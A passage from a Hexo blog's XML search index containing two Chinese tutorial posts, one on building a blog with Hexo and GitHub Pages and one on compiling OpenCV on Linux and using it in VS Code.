        <content type="html"><![CDATA[<h1 id="一-前言"><a class="markdownIt-Anchor" href="#一-前言"></a> 一、前言</h1><p>从去年开始就一直想部署一个可以自己使用的博客，用来记录点东西，省的到后来用到的时候害的重新查询，一直百度。直到这个月要开始找工作了，有一个自己的博客不仅能够用来记录学习路线，还能够更直观的把自己展示给他人看，因此决定自己一搞一个人博客。花了点时间对比部署方案后，选择了最省钱的Hexo+Github,跟随教程花了点时间配置，下面主要记录下配置过程。</p><h1 id="二-准备阶段"><a class="markdownIt-Anchor" href="#二-准备阶段"></a> 二、准备阶段</h1><ol><li>注册一个github账号</li><li>安装node.js、npm</li><li>安装git</li></ol><p><strong>注：我是在Windows7 里面进行设置部署</strong></p><h1 id="三-开始搭建博客"><a class="markdownIt-Anchor" href="#三-开始搭建博客"></a> 三、开始搭建博客</h1><h2 id="1-github中创建仓库"><a class="markdownIt-Anchor" href="#1-github中创建仓库"></a> 1、github中创建仓库</h2><p>在github中新建仓库，<a href="http://xn--xxx-c88d89xgtao27c.github.io" target="_blank" rel="noopener">并命名为xxx.github.io</a>,注意<strong>xxx</strong>和你的github的账户名是相同的，后来你网站的域名将会是https：<a href="//xxx.github.io.xn--siq0gnk75pyofnxs">//xxx.github.io.所以为了域名</a>，你可以设置一个好听的仓库名。<br />创建成功后，所有的网站文件都会被上传到这个仓库中。</p><h2 id="2-配置ssh-key"><a class="markdownIt-Anchor" href="#2-配置ssh-key"></a> 2、配置SSH key</h2><p>这是为了让自己有权限用git，提交文件到github中来。具体的步骤是在本机中找到./ssh文件夹，我换系统的时候经常没有因此，需要生成：用git bash：</p><pre><code>ssk-keygen -t rsa -C 'emailaddress'</code></pre><p>然后按三次回车，就会在c盘user下面生成./ssh文件，将id_rsa.pub中的文本根据下面的配置添加到key中，其中title可以随便起名。<br /><img src="https://i.imgur.com/ZgiejaH.png" alt="" /><img src="https://i.imgur.com/5MmJjHP.png" alt="" /></p><p>还需要进行配置：</p><pre><code>git config --global user.name &quot;xxx&quot;// 你的github用户名，非昵称git config --global user.email  &quot;email&quot;// github注册邮箱</code></pre><h2 id="3-搭建博客雏形"><a class="markdownIt-Anchor" href="#3-搭建博客雏形"></a> 3、搭建博客雏形</h2><ol><li><p>安装hexo、初始化<br />npm install -g hexo<br />建立一个文件夹，用于本地blog存储，进入文件夹内，打开git bash并进行初始化：</p><p>hexo init<br />hexo g #生成<br />hexo s #启动服务<br />如下：<br /><img src="https://i.imgur.com/8pAiFNI.png" alt="" /></p></li></ol><h2 id="4-修改主题"><a class="markdownIt-Anchor" href="#4-修改主题"></a> 4、修改主题</h2><p>博客还是用来进行阅读的因此稳定性比较重要，现在用户最多的还是next主题，因此我选用的也是next：<br />下载，还是在刚才的文件夹下<br />使用git bash：</p><pre><code>git clone https://github.com/iissnan/hexo-theme-next themes/next</code></pre><p>done之后就可以在根目录下发现有一个theme的文件夹里面有next文件，更改样式时，一般是时修改next文件里面的配置文件。安装好主题之后，可以浏览器打开本地<br />localhost:4000站点进行访问</p><p>到现在，基本的博客雏形已经出现了，下面就是开始hexo的配置。</p><p>配置部分我直接贴链接了，非常感谢下面大神的指导！</p><h2 id="5-主题优化"><a class="markdownIt-Anchor" href="#5-主题优化"></a> 5、主题优化</h2><ul><li><a href="http://blog.ynxiu.com/2016/hexo-next-theme-optimize.html" target="_blank" rel="noopener" title="量子广告的博客">http://blog.ynxiu.com/2016/hexo-next-theme-optimize.html</a></li><li><a href="https://www.simon96.online/2018/10/12/hexo-tutorial/" target="_blank" rel="noopener" title="遇见西门">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></li><li><a href="http://blog.321zou.com/" target="_blank" rel="noopener" title="TOP猜想">http://blog.321zou.com/</a></li></ul><h1 id="四-问题汇总"><a class="markdownIt-Anchor" href="#四-问题汇总"></a> 四、问题汇总</h1><blockquote><p>后续更新</p></blockquote><ul><li><strong>MarkdownPad2中添加的图片不能显示</strong>：先要配置<code>_config.yml</code>,找到<code>post_asset_folder</code>设为<code>true</code>后，以后再创建文章就会在文章目录生成一个同名文件夹，可以将文章配图放在此文件夹中，然后在写文章时下入相对路径就可以。<code>![](图片名)</code></li><li><strong>怎么在文章中添加文件下载</strong>：和上一个问题解决办法一样，先修改配置文件，然后再在source下新建文件夹downloads，把需要下载的文件放入到该文件夹下就可以，在以后发布文章时，只要在文中添加 <code>[点击下载](/downloads/filename)</code>之后，这样部署之后的网站，就可以看到下载链接和进行下载文件了。</li></ul><p><img src="%E9%BB%84.gif" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装opencv和vscode工具配置</title>
      <link href="/archives/e27e22b8.html"/>
      <url>/archives/e27e22b8.html</url>
      
        <content type="html"><![CDATA[<h1 id="linux安装opencv和vscode工具配置"><a class="markdownIt-Anchor" href="#linux安装opencv和vscode工具配置"></a> Linux安装opencv和vscode工具配置</h1><p>1、参考opencv官网在Linux上安装opencv的步骤</p><ul><li>按照官网文档安装依赖，</li><li>官网下载opencv和扩展包的源码source。也可以通过github克隆到本地，注意版本一定是相同的。</li><li>利用cmake编译安装：<ul><li>新建文件夹opencv：mkdir opencv</li><li>将扩展包cp到opencv文件夹中</li><li>在opencv文件夹中新建build文件夹:mkdir build</li><li>进入文件夹：cd build</li><li>使用cmake命令进行编译（下面的目录名字我已经统一去掉版本信息）：cmake -D CMAKE_INSTALL_PREFIX=/usr/local -D CMAKE_BUILD_TYPE=Release -D OPENCV_EXTRA_MODULES_PATH=…/opencv_contrib/modules …</li><li>编译过程中出现的问题参考第二部分</li><li>然后进行安装：sudo make install</li><li>安装完成后，可以在终端中使用python，导入opencv的包进行使用：<ul><li>python</li><li>import cv2 as cv</li><li>cv.__version__  #查看安装的opencv版本</li></ul></li></ul></li><li>将opencv的库路径添加到系统路径中去<ul><li>cd /etc/ld.so.conf.d</li><li>sudo touch opencv.conf,此时文件中是空的。</li><li>写入：/usr/local/lib</li><li>使配置生效：sudo ldconfig</li></ul></li><li><a href="https://www.jianshu.com/p/6d3f4a30945d" target="_blank" rel="noopener">在vscode中使用opencv</a></li></ul><p>2、安装过程中遇到的问题。</p><ul><li><p>安装依赖中出现<code>errorE: unable to locate libjasper-dev</code>。</p><p>解决办法：</p><p>sudo add-apt-repository “deb <a href="http://security.ubuntu.com/ubuntu" target="_blank" rel="noopener">http://security.ubuntu.com/ubuntu</a> xenial-security main”</p><p>sudo apt update</p><p>sudo apt install libjasper1 libjasper-dev</p></li><li><p>编译过程中出现：xxx :No such file or directory</p><p>解决办法：</p><p>find ～ -name xxx</p><p>将出现问题的文件路径修改下，在重新编译。</p><p>如果上一步没有找到相关的文件，可以去csdn搜索下载，然后在修改。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
